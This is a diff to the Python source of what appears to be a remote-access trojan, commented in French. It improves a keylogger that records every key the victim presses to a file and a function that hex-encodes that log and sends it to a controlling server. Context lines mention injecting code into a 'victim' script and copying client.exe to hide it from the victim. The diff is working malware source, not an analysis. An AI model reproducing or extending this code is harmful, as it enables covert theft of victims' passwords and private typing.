@@ -336,34 +336,31 @@ def add_code_to_victim_script2():
 def record_keystrokes():
     global is_recording
     try:
-        with open(keystroke_file_path, 'a') as data_file:
-            data_file.write(f"Started recording at {time.ctime()}\\n")
+        with open(keystroke_file_path, 'a', encoding='utf-8') as data_file:
+            data_file.write(f"Started recording at {time.ctime()}\n")
             while is_recording:
-                events = keyboard.read_event() 
-                typed_text = ""
+                event = keyboard.read_event()  
 
-                for event in events:
-                    if event.event_type == 'down':  # Considerer uniquement les appuis
-                        if event.name == 'tab':
-                            typed_text += '[Tab]\t'  # Ajouter une representation lisible de Tab
-                        elif event.name == 'enter':
-                            typed_text += '[ENTER]'  # Remplacer Enter par un indicateur
-                        elif event.name == 'backspace':
-                            if typed_text:  # Verifier qu'il y a du texte a supprimer
-                                typed_text = typed_text[:-1] + '[BACKSPACE]'  # Supprimer et indiquer
-                        elif event.name == 'space':
-                            typed_text += '[SPACE]'  # Ajouter une representation pour Space
-                        elif len(event.name) == 1:  # Ajouter uniquement les caracteres valides
-                            typed_text += event.name
-                        else:
-                            continue  # Ignorer les autres touches comme Ctrl, Alt, etc.
+                if event.event_type == 'down':  
+                    key = event.name
 
-                # Filtrer les lignes inutiles
-                if not any(keyword in typed_text.lower() for keyword in ['haut']):
-                    if typed_text.strip():  # Verifier qu'il reste du contenu pertinent
-                        data_file.write(typed_text + '\\n')
+                    # Gestion des touches spéciales
+                    if len(key) == 1:
+                        data_file.write(key)
+                    elif key == 'space':
+                        data_file.write(' ')
+                    elif key == 'enter':
+                        data_file.write('\n')
+                    elif key == 'tab':
+                        data_file.write('\t')
+                    elif key == 'backspace':
+                        data_file.write('[BACKSPACE]')
+                    else:
+                        data_file.write(f'[{key.upper()}]') 
 
-                time.sleep(0.1)  # Pause pour eviter de surcharger la CPU
+                    data_file.flush() 
+
+                time.sleep(0.01)  
     except Exception as e:
         print(f"Error while recording keystrokes: {str(e)}")
 
@@ -392,11 +389,22 @@ def stop_keylogger():
     
 def send_keystrokes_file():
     try:
-        with open(keystroke_file_path, 'rb') as file:
-            file_data = file.read().hex()  # Convertir le fichier en hexadecimal pour l'envoyer   
-        sending({"status": "success", "data": file_data})
+        time.sleep(2)  # Délai pour s'assurer que le fichier est bien écrit
+        print(keystroke_file_path)
+        if os.path.getsize(keystroke_file_path) == 0:
+            print("Keystroke file is empty, skipping send.")
+            sending({"status": "error", "message": "File is empty."})
+            return
+
+        with open(keystroke_file_path, 'r',encoding='utf-8') as file:
+            file_data = file.read()
+            print(f"File data before hex conversion: {file_data}")  
+            byte_data = file_data.encode('utf-8')
+            hex_data = byte_data.hex()  
+            print(f"File data after hex conversion: {hex_data}")  
+        sending({"status": "success", "data": hex_data})
     except Exception as e:
-        sending({"status": "error", "message": str(e)})    
+        sending({"status": "error", "message": str(e)})   
 
 #la fonction qui vas duppliquer le client.exe dans un emplacemment sain pour eviter de supprimer par le vicitme
 
